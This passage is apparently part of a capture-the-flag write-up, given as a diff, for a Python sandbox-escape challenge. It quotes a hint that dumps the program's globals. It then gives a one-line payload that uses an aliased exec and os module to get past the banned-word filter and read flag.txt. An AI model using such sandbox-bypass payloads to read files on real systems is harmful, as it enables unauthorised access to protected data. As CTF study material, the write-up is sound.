@@ -1,0 +1,11 @@
+<p>From level 1, we have:</p>
+<blockquote>
+<p>Word of advice,remember this:weYbdk9012ghiwh=0?</p>
+</blockquote>
+<p>Entering <code>weYbdk9012ghiwh=0?</code> as the helpline id in <code>3. Use helpline</code> gives:</p>
+<pre><code class="language-py">{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x7f72267e4f10&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, '__file__': '/endgame.py', '__cached__': None, 'banned': ['import', &lt;built-in function print&gt;, &lt;built-in function exec&gt;, &lt;built-in function eval&gt;, 'read', &lt;built-in function open&gt;, &lt;built-in function globals&gt;], 'sos': &lt;module 'os' from '/usr/lib/python3.8/os.py'&gt;, 'beat_the_master': &lt;built-in function exec&gt;, 'main': &lt;function main at 0x7f72266dde50&gt;, 'escape': &lt;function escape at 0x7f72266ddee0&gt;}
+</code></pre>
+<p>This, then, gets the flag:</p>
+<pre><code class="language-py">beat_the_master('print(sos.read(sos.open(&quot;./flag.txt&quot;, sos.O_RDONLY), 100))')
+</code></pre>
+<p>(I lost my original payload, but it was a little simpler than this one.)</p>
